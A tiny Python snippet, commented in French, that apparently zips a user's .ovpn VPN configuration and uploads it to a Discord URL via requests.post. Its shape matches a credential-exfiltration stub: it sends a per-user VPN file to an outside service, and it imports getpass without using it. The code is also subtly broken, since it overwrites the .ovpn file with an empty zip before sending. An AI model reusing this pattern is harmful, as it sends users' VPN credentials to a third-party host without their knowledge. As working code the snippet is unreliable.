# mettre un ficher dans un zip linux est envoie le zip sur discord
import getpass
import os
import zipfile
import requests

# create a zip file

class Zip:
    def __init__(self):
        pass

    def send(self, user, url):
        zipfile.ZipFile(f'{user}.ovpn', 'w', zipfile.ZIP_DEFLATED)    
        requests.post(url=url, files={"file": open(f"{user}.ovpn", "rb")})
    
 
